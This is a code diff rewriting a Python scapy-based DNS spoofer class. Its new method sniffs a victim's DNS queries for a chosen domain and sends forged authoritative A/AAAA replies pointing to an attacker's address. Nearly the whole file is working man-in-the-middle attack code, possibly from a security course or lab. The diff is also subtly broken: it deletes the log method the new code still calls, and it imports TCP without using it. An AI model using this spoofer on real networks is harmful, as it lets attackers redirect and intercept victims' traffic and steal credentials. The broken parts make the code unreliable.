@@ -1,64 +1,78 @@
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
+from scapy.all import IP, UDP, DNS, TCP, DNSQR, DNSRR, send
 from scapy.layers.inet6 import IPv6
 
 
 class DNSSpoofer:
-    def __init__(self, interface, victim_ip, dns_mapping, attacker_ip, attacker_ipv6, logger):
+    def __init__(self, interface, victim_ip, domain_to_spoof,
+                 attacker_ip, attacker_ipv6=None, logger=None):
         self.interface = interface
         self.victim_ip = victim_ip
+        self.domain_to_spoof = domain_to_spoof
         self.attacker_ip = attacker_ip
         self.attacker_ipv6 = attacker_ipv6
-        self.dns_mapping = dns_mapping  # { "example.com": "1.2.3.4" }
         self.logger = logger
-        self.running = False
 
-    def start(self):
-        self.running = True
+    def dns_spoofer(self, packet):
+        # Only UDP DNS
+        if not packet.haslayer(DNS) or not packet.haslayer(UDP):
+            return
 
-    def stop(self):
-        self.running = False
+        dns = packet[DNS]
 
-    def log(self, msg):
-        if self.logger:
-            self.logger(msg)
-        else:
-            print(msg)
+        # Only DNS queries
+        if dns.qr != 0 or dns.qdcount == 0:
+            return
 
-    def _get_src_ip(self, packet):
+        # IP version
         if packet.haslayer(IP):
-            return packet[IP].src, IP
-        if packet.haslayer(IPv6):
-            return packet[IPv6].src, IPv6
-        return None, None
-    
-    def _dns_filter(self, packet):
-        if packet.haslayer(DNSRR):
-            try:
-                # Get the domain name of the DNS request
-                qname = packet[DNSQR].qname
-                domain = (
-                    qname.decode("utf-8", errors="ignore").rstrip(".")
-                    if isinstance(qname, bytes)
-                    else str(qname).rstrip(".")
+            ip_cls = IP
+            src = packet[IP].src
+            dst = packet[IP].dst
+        elif packet.haslayer(IPv6):
+            ip_cls = IPv6
+            src = packet[IPv6].src
+            dst = packet[IPv6].dst
+        else:
+            return
+
+        if src != self.victim_ip:
+            return
+
+        qname = dns.qd.qname
+        qtype = dns.qd.qtype
+
+        domain = qname.decode(errors="ignore").rstrip(".").lower()
+
+        if domain != self.domain_to_spoof.lower():
+            return
+
+        # A or AAAA only
+        if qtype == 1:          # A
+            rdata = self.attacker_ip
+            rrtype = "A"
+        elif qtype == 28:       # AAAA
+            rdata = self.attacker_ipv6
+            rrtype = "AAAA"
+        else:
+            return
+
+        reply = (
+            ip_cls(src=dst, dst=src) /
+            UDP(sport=53, dport=packet[UDP].sport) /
+            DNS(
+                id=dns.id,
+                qr=1,
+                aa=1,
+                ra=1,
+                qd=dns.qd,
+                an=DNSRR(
+                    rrname=qname,
+                    type=rrtype,
+                    ttl=300,
+                    rdata=rdata
                 )
-                spoof_ip = self.dns_mapping.get(domain)
-                if not spoof_ip:
-                    # Skip if we don't want to spoof this IP
-                    return False
-                # Set the spoofed IP.
-                packet[DNS].an = DNSRR(rrname=qname, rdata=spoof_ip)
-                # Set nr. of answers to 1.
-                packet[DNS].ancount = 1
-                # Remove checksums
-                del packet[IP].len
-                del packet[IP].chksum
-                del packet[UDP].len
-                del packet[UDP].chksum
-                # Send modified packet and return that we spoofed it.
-                send(packet, iface=self.interface, verbose=0)
-                self.logger(f"Spoofed {domain}")
-                return True
-            except Exception as e:
-                self.logger(f"DNS filter error: {e}")
-                return False
-        return False
+            )
+        )
+
+        send(reply, iface=self.interface, verbose=0)
+        self.log(f"[DNS] Spoofed {qname.decode().rstrip('.')} → {rdata}")
